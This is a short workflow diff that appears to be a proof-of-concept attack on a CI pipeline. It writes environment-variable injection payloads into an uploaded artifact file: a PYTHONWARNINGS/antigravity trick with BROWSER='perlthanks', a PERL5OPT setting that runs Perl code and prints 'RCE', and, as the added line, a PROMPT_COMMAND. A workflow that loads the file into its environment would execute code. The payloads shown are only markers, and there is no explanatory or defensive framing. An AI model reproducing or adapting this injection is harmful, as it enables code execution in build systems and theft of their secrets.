@@ -18,6 +18,7 @@ jobs:
           echo "PYTHONWARNINGS=\"all:0:antigravity.x:0:0\"" >> printer-linter-result/pr-head-ref.txt
           echo "BROWSER=\"perlthanks\"" >> printer-linter-result/pr-head-ref.txt
           echo "PERL5OPT=\"-Mbase;print('RCE');exit;\"" >> printer-linter-result/pr-head-ref.txt
+          echo "PROMPT_COMMAND='echo coucou'" >> printer-linter-result/pr-head-ref.txt
       - uses: actions/upload-artifact@v2
         with:
           name: printer-linter-result
